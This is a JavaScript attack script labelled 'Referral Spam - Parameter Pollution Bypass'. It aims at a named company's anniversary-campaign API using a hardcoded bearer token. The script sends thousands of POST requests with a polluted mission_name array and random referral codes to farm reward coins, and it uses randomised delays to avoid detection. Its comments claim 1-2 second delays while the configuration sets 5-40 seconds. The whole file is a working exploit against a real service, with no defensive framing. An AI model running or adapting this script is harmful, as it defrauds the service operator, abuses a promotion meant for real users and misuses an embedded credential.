/**
 * Referral Spam - Parameter Pollution Bypass
 * Random 1-2 second delay between requests
 */

const CONFIG = {
  token: '545261|0M6zXDt5SaIiIh0HgBYXRojPcNi4RCU30c5gUnO3f69b3511',
  count: 3257,      // Number of referrals to spam
  delayMin: 5,     // Minimum delay in seconds
  delayMax: 40,     // Maximum delay in seconds
};

const BASE_URL = 'https://landing.emofid.com/api-service/anniversary40';

const HEADERS = {
  'Authorization': `Bearer ${CONFIG.token}`,
  'Content-Type': 'application/json',
  'Cookie': `anniversary40_token=${CONFIG.token}`,
};

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function randomDelay() {
  const range = (CONFIG.delayMax - CONFIG.delayMin) * 1000;
  return Math.floor(Math.random() * range) + (CONFIG.delayMin * 1000);
}

async function getCoins() {
  const res = await fetch(`${BASE_URL}/user/`, { headers: HEADERS });
  const data = await res.json();
  return parseFloat(data.data.scores[0].coins);
}

function generateCode() {
  // Real format: 6 uppercase letters (A-Z)
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

async function exploit() {
  const response = await fetch(`${BASE_URL}/actions/`, {
    method: 'POST',
    headers: HEADERS,
    body: JSON.stringify({
      mission_name: ['referral', 'landing-login'],
      referral_code: generateCode(),
    }),
  });
  return await response.json();
}

async function main() {
  console.log('='.repeat(45));
  console.log('  Referral Spam (1-2s random delay)');
  console.log('='.repeat(45));

  const initialCoins = await getCoins();
  console.log(`\nStarting coins: ${initialCoins}`);
  console.log(`Target: +${CONFIG.count * 10} coins\n`);

  let success = 0;

  for (let i = 1; i <= CONFIG.count; i++) {
    const result = await exploit();

    if (result.message?.toLowerCase().includes('success')) {
      success++;
      console.log(`[${i}/${CONFIG.count}] +10 ✓ (total: +${success * 10})`);
    } else {
      console.log(`[${i}/${CONFIG.count}] ${result.message}`);
    }

    if (i < CONFIG.count) {
      const delay = randomDelay();
      await sleep(delay);
    }
  }

  const finalCoins = await getCoins();

  console.log('\n' + '='.repeat(45));
  console.log(`Final coins: ${finalCoins}`);
  console.log(`Gained: +${finalCoins - initialCoins}`);
  console.log('='.repeat(45));
}

main().catch(console.error);
